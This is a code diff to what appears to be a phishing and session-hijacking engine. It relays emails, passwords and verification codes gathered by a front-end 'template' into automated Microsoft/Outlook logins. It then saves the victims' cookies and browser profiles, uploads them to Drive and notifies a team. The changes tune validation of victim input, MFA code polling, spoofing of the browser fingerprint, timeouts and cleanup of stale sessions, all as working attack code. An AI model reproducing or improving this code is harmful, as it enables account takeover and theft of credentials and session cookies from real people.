@@ -7,7 +7,7 @@ import {
     isDev,
     launchBrowser,
 } from "../../../../utils/utils.js";
-import { applyIdentityToPage, identitySummary } from "../../../../utils/identity.js";
+import { applyIdentityToPage, applyUserAgentViaCDP, identitySummary } from "../../../../utils/identity.js";
 import { maskProxy } from "../../../../utils/proxy.js";
 import logger from "../../../../utils/logger.js";
 import { platformConfigs } from "./platforms.js";
@@ -30,6 +30,7 @@ import {
     solveRecaptchaChallengeWithAI,
     activelyProcessing,
     isTemplateAlive,
+    lastPollTime,
     verifyPageStillValid,
     detectPasswordError,
     detectAccountLocked,
@@ -1608,18 +1609,6 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         };
                     }
 
-                    // If no verification screen, immediately set WAITINGPASSWORD after email submission
-                    // so template shows password form while engine navigates intermediate views
-                    if (step.selector === 'nextButton' && !password && browserId) {
-                        logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (flow-based, before additional views).`);
-                        updateBrowserRowDataFast(browserId, {
-                            status: "WAITINGPASSWORD",
-                            email: email || '',
-                            verified: false,
-                            fullAccess: false
-                        });
-                    }
-
                     // If no verification screen, then handle general additional views
                     await handleAdditionalViews(page, platformConfig, instanceId);
                 }
@@ -1676,6 +1665,18 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                         // If no email error was detected, assume email exists and proceed
                         emailExists = true;
+
+                        // Set WAITINGPASSWORD AFTER error check confirms email is valid
+                        if (!password && browserId) {
+                            logger.info(`[checkAccountAccess][${instanceId}] WAITINGPASSWORD set (after email validation passed).`);
+                            updateBrowserRowDataFast(browserId, {
+                                status: "WAITINGPASSWORD",
+                                email: email || '',
+                                verified: false,
+                                fullAccess: false
+                            });
+                        }
+
                         if (!password) {
                             // Microsoft intermittently shows a "Verify it's you" security challenge with a
                             // "Use your password" tile before the password form renders (late-loading on the
@@ -2432,7 +2433,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 if (browser.identity) {
                     await applyIdentityToPage(page, browser.identity);
                 } else {
-                    await page.setUserAgent(browser.selectedUserAgent);
+                    await applyUserAgentViaCDP(page, browser.selectedUserAgent);
                     await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
                 }
 
@@ -2489,6 +2490,27 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 const cachedStrictly = getCachedRow(browserId)?.strictly;
                 const strictlyKey = String(row[columnIndexes['strictly']] || cachedStrictly || '').trim().toLowerCase();
                 if (strictlyKey && platformConfigs[strictlyKey] && platformConfigs[strictlyKey].url) {
+                    // Domain validation: if the domain has no MX records AND doesn't contain any
+                    // of the strictly platform's mxKeywords, the email is almost certainly invalid
+                    // for that platform (e.g. test@test.com falling back to 'outlook'). Reject
+                    // before navigating — Outlook shows a password form for any email format, so
+                    // the error would never be detected by checkAccountAccess.
+                    const strictKeywords = platformConfigs[strictlyKey].mxKeywords || [];
+                    const domainMatchesStrictly = strictKeywords.some(kw => domain.includes(kw));
+                    if (mxRecords.length === 0 && !domainMatchesStrictly) {
+                        logger.warn(`[processRow][${browserId}] Domain '${domain}' has no MX records and does not match strictly platform '${strictlyKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
+                        finalStatus = "WAITINGEMAILERROR";
+                        updateData.status = finalStatus;
+                        updateData.lastJsonResponse = JSON.stringify({
+                            browserId, email, status: finalStatus,
+                            platform: strictlyKey, domain: domain || '',
+                            timestamp: new Date().toISOString(),
+                            message: `Email domain '${domain}' is not a valid ${strictlyKey} address. Please use a valid email.`
+                        });
+                        sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictlyKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictlyKey}` });
+                        updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                        return;
+                    }
                     logger.warn(`[processRow][${browserId}] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictlyKey}'.`);
                     matchedPlatformKey = strictlyKey;
                 }
@@ -2705,6 +2727,24 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                             // 'No URL defined for platform: unknown'). Navigate to the strictly login.
                             const strictFallbackKey = String(row[columnIndexes['strictly']] || getCachedRow(browserId)?.strictly || '').trim().toLowerCase();
                             if (strictFallbackKey && platformConfigs[strictFallbackKey] && platformConfigs[strictFallbackKey].url) {
+                                // Domain validation: same check as the initial WAITING path
+                                const strictKeywords = platformConfigs[strictFallbackKey].mxKeywords || [];
+                                const domainMatchesStrictly = strictKeywords.some(kw => domain.includes(kw));
+                                if (mxRecords.length === 0 && !domainMatchesStrictly) {
+                                    logger.warn(`[processRow][${browserId}][WAITINGEMAIL] Domain '${domain}' has no MX records and does not match strictly platform '${strictFallbackKey}' (keywords: [${strictKeywords.join(', ')}]). Rejecting as invalid email.`);
+                                    finalStatus = "WAITINGEMAILERROR";
+                                    updateData.status = finalStatus;
+                                    updateData.lastJsonResponse = JSON.stringify({
+                                        browserId, email, status: finalStatus,
+                                        platform: strictFallbackKey, domain: domain || '',
+                                        timestamp: new Date().toISOString(),
+                                        message: `Email domain '${domain}' is not a valid ${strictFallbackKey} address. Please use a valid email.`
+                                    });
+                                    sendWrongInputAlert({ type: 'WRONG_EMAIL', platform: strictFallbackKey, email, browserId, password: password || '', detail: `Domain '${domain}' has no MX and doesn't match ${strictFallbackKey}` });
+                                    updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
+                                    exitingEarly = true;
+                                    return;
+                                }
                                 logger.warn(`[processRow][${browserId}][WAITINGEMAIL] No MX platform for '${domain}' (mx=${mxRecords.length}) — falling back to strictly platform '${strictFallbackKey}'.`);
                                 matchedPlatformKey = strictFallbackKey;
                             }
@@ -4641,7 +4681,7 @@ if (!foundSelector) {
             }
             logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
         } else if (status === "WAITINGCODE") {
-            logger.info(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
+            logger.warn(`[processRow][${browserId}] —RESUME WAITINGCODE— sheetStatus=${sheetStatus} verified=${row[columnIndexes['verified']] ?? 'n/a'} driveUrl=${updateData.driveUrl || 'none'} code=${row[columnIndexes['verificationCode']] ? String(row[columnIndexes['verificationCode']]).slice(0, 4) : 'none'}`);
             finalStatus = "WAITINGCODE";
             initialCheckResult.accountAccess = true;
             if (updateData.status !== "WAITINGCODE") {
@@ -5011,7 +5051,7 @@ if (!foundSelector) {
 
                                             if (browser) {
                                                 if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
-                                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                                 browserFullyClosed = true;
                                                 activeBrowserSessions.delete(browserId);
                                                 await new Promise(resolve => setTimeout(resolve, 2000));
@@ -5060,7 +5100,7 @@ if (!foundSelector) {
                                     updateData.verified = true;
                                     updateData.fullAccess = false;
                                     finalStatus = "WAITINGCODE";
-                                    logger.info(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
+                                    logger.warn(`[engineProcess][${browserId}] -WAITINGCODE (incorrect code)`);
                                     activelyProcessing.delete(browserId);
                                     break; // Exit while loop — finalizer writes WAITINGCODE state to sheet
                                 }
@@ -5491,6 +5531,7 @@ if (!foundSelector) {
             if (finalStatus === "WAITINGCODE" && !codeSuccessfullyProcessed && Date.now() >= pollingTimeout) {
                 pollingTimedOut = true;
                 logger.warn(`[processRow][${browserId}][WAITINGCODE] Polling for code timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
+                notifyTeam({ type: 'WAITINGCODE_TIMEOUT', platform, email, browserId, detail: 'Verification code polling timed out after 5 minutes. Setting FAILED.' });
                 finalStatus = "FAILED";
                 updateData.status = "FAILED";
                 updateData.verified = true;
@@ -5516,7 +5557,7 @@ if (!foundSelector) {
                     message: "Incorrect code, returned to verification options."
                 });
             }
-            logger.info(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
+            logger.warn(`[processRow][${browserId}] Exited WAITING_CODE loop. Final status for sheet update: ${updateData.status}`);
         }
 
         // Re-entry: the email phase (WAITING/WAITINGEMAIL) accepted the email and a password
@@ -5524,7 +5565,7 @@ if (!foundSelector) {
         // PROCESSING (template stays in loading) and the password is typed immediately —
         // the user never has to re-enter it, and the template never flickers to the form.
         if ((status === "WAITING" || status === "WAITINGEMAIL") && !emailPhasePasswordReentry && initialCheckResult.verificationState === 'WAITING_PASSWORD' && password && String(password).trim() !== '') {
-            logger.info(`[processRow][${browserId}] Email accepted & password already available. Proceeding directly to password entry (no WAITINGPASSWORD flicker).`);
+            logger.warn(`[processRow][${browserId}] Email accepted & password already available. Proceeding directly to password entry (no WAITINGPASSWORD flicker).`);
             emailPhasePasswordReentry = true;
             status = "WAITINGPASSWORD";
             continue;
@@ -5532,7 +5573,7 @@ if (!foundSelector) {
         break;
         }
 
-        logger.info(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
+        logger.warn(`[processRow][${browserId}] Result from checkAccountAccess: ${JSON.stringify(initialCheckResult)}`);
 
         // Determine finalStatus based on initialCheckResult and current state
         let currentVerificationOptions = initialCheckResult.verificationOptions || [];
@@ -5727,7 +5768,7 @@ if (!foundSelector) {
         } else if (finalStatus === "FAILED" && initialCheckResult.emailExists) {
             if (initialCheckResult.verificationState === 'WAITING_PASSWORD') {
                 if (password) {
-                    logger.info(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
+                    logger.warn(`[processRow][${browserId}] WAITING_PASSWORD but password already available. Restoring to WAITINGPASSWORD for retry.`);
                     updateData.status = "WAITINGPASSWORD";
                     updateBrowserRowDataFast(browserId, { status: "WAITINGPASSWORD", email: email || '' });
                     return;
@@ -5785,7 +5826,7 @@ if (!foundSelector) {
         if (finalStatus === "WAITINGOPTIONS" || finalStatus === "WAITINGCODE" || finalStatus === "WAITINGRECOVERYEMAIL") { // Also update for WAITING_CODE if options are relevant
             updateData.verificationOptions = JSON.stringify(currentVerificationOptions);
             updateData.engineProcessing = false;
-            logger.info(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
+            logger.warn(`[engineProcess][${browserId}] -FINAL (return from waiting state)`);
             activelyProcessing.delete(browserId);
             // Force direct sheet write (bypass updateBrowserRowDataFast which only cascades terminal states)
             // so processWaitingRows reads the correct status + fresh lastUserActivity from the sheet.
@@ -5796,7 +5837,7 @@ if (!foundSelector) {
             });
             setCachedRow(browserId, { ...(getCachedRow(browserId) || {}), ...updateData });
             invalidateCache(); // Force cookieDataFetcher re-fetch so processWaitingRows sees fresh WAITINGCODE status
-            logger.info(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated (direct write + cache invalidated).`);
+            logger.warn(`[processRow][${browserId}] Status set to ${finalStatus}. Sheet updated (direct write + cache invalidated).`);
             return; // Prevent fall-through to COMPLETED handler which would overwrite WAITINGCODE status
         }
 
@@ -5929,7 +5970,13 @@ if (!foundSelector) {
                         if (browser) {
                             if (targetCreatedListener && browser && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                             logger.info(`[processRow][${browserId}] Closing browser for COMPLETED status before Drive upload (release profile file locks).`);
-                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
+                            await Promise.race([
+                                browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`)),
+                                new Promise(resolve => setTimeout(() => {
+                                    logger.warn(`[processRow][${browserId}] browser.close() timed out after 30s — proceeding with staging and upload.`);
+                                    resolve();
+                                }, 30000))
+                            ]);
                             browserFullyClosed = true;
                             activeBrowserSessions.delete(browserId);
                         }
@@ -6355,7 +6402,43 @@ async function processWaitingRows() {
         const data = await fetchDataFromAppScript(3, 120000, false);
 
         if (!Array.isArray(data) || data.length === 0) {
-            logger.warn('Invalid or empty data fetched from App Script.');
+            logger.warn('Invalid or empty data fetched from App Script. Running fallback stale detection on active sessions.');
+            // --- Fallback stale detection: clean up abandoned sessions via in-memory maps ---
+            // When both auth paths are broken, we can't read the sheet but we can still
+            // detect stale sessions via lastPollTime (updated by pooling-operator on each template poll).
+            const STALE_TIMEOUT_FALLBACK = 10 * 60 * 1000;
+            const fallbackCleaned = [];
+            for (const [bId, session] of activeBrowserSessions) {
+                if (activeProcesses.has(bId)) continue;
+                const lastPoll = lastPollTime.get(bId);
+                const age = lastPoll ? Date.now() - lastPoll.getTime() : Infinity;
+                if (age > STALE_TIMEOUT_FALLBACK) {
+                    logger.warn(`[processWaitingRows] Fallback stale detection: browserId='${bId}', lastPollAge=${lastPoll ? age + 'ms' : 'never'}. Closing and marking FAILED.`);
+                    try { if (session?.browser) await session.browser.close(); } catch (e) {}
+                    try { if (session?.page) session.page.removeAllListeners?.('targetcreated'); } catch (e) {}
+                    activeBrowserSessions.delete(bId);
+                    activeProcesses.delete(bId);
+                    fallbackCleaned.push(bId);
+                }
+            }
+            // Write FAILED to cache/sheet for all cleaned sessions (sheet write may fail
+            // but cache keeps the correct state until auth is restored)
+            for (const bId of fallbackCleaned) {
+                updateBrowserRowDataFast(bId, {
+                    status: "FAILED",
+                    verified: false,
+                    fullAccess: false,
+                    lastJsonResponse: JSON.stringify({
+                        browserId: bId, status: "FAILED",
+                        message: "Session timed out. Please try again.",
+                        timestamp: new Date().toISOString()
+                    }),
+                    ...submissionHistoryPayload(bId)
+                });
+            }
+            if (fallbackCleaned.length > 0) {
+                logger.info(`[processWaitingRows] Fallback stale detection cleaned ${fallbackCleaned.length} abandoned session(s): ${fallbackCleaned.join(', ')}`);
+            }
             isProcessingInterval = false;
             return;
         }
@@ -6747,10 +6830,11 @@ export async function POST(request) {
                         try {
                             await processRow(row, colIndexes, session?.browser, session?.page);
                         } finally {
-                            // Release the lease once the job finished AND the stored session is gone
-                            // (browser closed / terminal state). If the session is still parked for
-                            // user input, keep the lease so the interval stays out of the way.
-                            if (!activeBrowserSessions.has(browserId)) activeProcesses.delete(browserId);
+                            // Always release the lease so processWaitingRows can re-pick the row
+                            // for Phase 2 polling (e.g. WAITINGCODE polling loop). Holding the lease
+                            // while the browser is parked in activeBrowserSessions blocked re-pickup
+                            // and left rows stuck in WAITINGCODE indefinitely.
+                            activeProcesses.delete(browserId);
                         }
                     } catch (err) {
                         logger.error(`[POST][${browserId}] Direct processRow error: ${err.message}`);
